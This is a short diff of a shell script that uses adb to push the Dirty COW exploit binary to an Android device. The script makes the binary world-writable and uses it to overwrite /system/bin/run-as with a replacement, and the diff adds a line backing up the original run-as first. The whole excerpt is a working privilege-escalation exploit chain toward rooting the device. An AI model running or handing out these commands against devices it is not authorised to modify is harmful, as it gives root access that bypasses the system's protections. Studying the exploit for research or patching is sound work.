@@ -13,6 +13,7 @@ adb push libs/$ARCH/dirtycow /data/local/tmp/dcow
 adb shell 'chmod 777 /data/local/tmp/dcow'
 
 adb push libs/$ARCH/run-as /data/local/tmp/run-as
+adb shell 'cp /system/bin/run-as /data/local/tmp/run-as.bak'
 adb shell '/data/local/tmp/dcow /data/local/tmp/run-as /system/bin/run-as'
 
 adb shell 'mkdir /data/local/tmp/rootme/'
